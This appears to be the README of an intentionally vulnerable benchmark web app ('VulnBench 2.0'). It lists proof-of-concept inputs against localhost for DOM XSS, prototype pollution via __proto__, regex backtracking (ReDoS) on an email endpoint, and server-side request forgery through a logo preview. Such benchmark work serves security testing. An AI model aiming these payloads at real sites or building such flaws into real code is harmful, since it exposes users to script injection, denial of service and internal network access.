# App Project Blanq VulnBench 2.0 POCs

Install and run the Nuxt app with:

```sh
pnpm install
pnpm dev
```

Nuxt normally serves on `http://localhost:3000`. If the native
`better-sqlite3` binding is unavailable, rerun `pnpm install`; the
project-local `pnpm-workspace.yaml` allows the native build script needed by
Nuxt Content.

## Campaign DOM XSS

The public landing page renders the `campaign` URL value as HTML:

```text
http://localhost:3000/?campaign=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

## Referral DOM XSS

The public registration page renders the referral URL fallback as HTML:

```text
http://localhost:3000/auth/register?referrer=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

## Workspace tooltip DOM XSS

The landing-page workspace preview renders the `name` query value as tooltip
HTML:

```text
http://localhost:3000/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

## Prototype pollution through shared preferences

Open this URL, then inspect the browser console:

```text
http://localhost:3000/?section=__proto__&value=owned
```

The following checks should return `owned`:

```js
({}).layout
({}).display
```

## Registration email ReDoS

The registration form now checks the email field through the policy API.
Generate a long near-match and paste it into the Email Address field so the
request exercises backtracking without changing application data:

```sh
EMAIL=$(python3 -c 'print("a" * 5000 + "!")')
curl -G --data-urlencode "email=$EMAIL" \
  http://localhost:3000/api/auth/email-policy
```

The direct API form is:

```text
http://localhost:3000/api/auth/email-policy?email=person%40example.com
```

## Logo preview SSRF

Enter this URL into the Partner logo preview field. The server fetches the
image bytes and the UI renders a thumbnail:

```sh
curl -G --data-urlencode 'url=http://127.0.0.1:3000/robots.txt' \
  http://localhost:3000/api/integrations/logo-preview
```

The browser-facing flow is:

```text
http://127.0.0.1:3000/favicon.ico
```
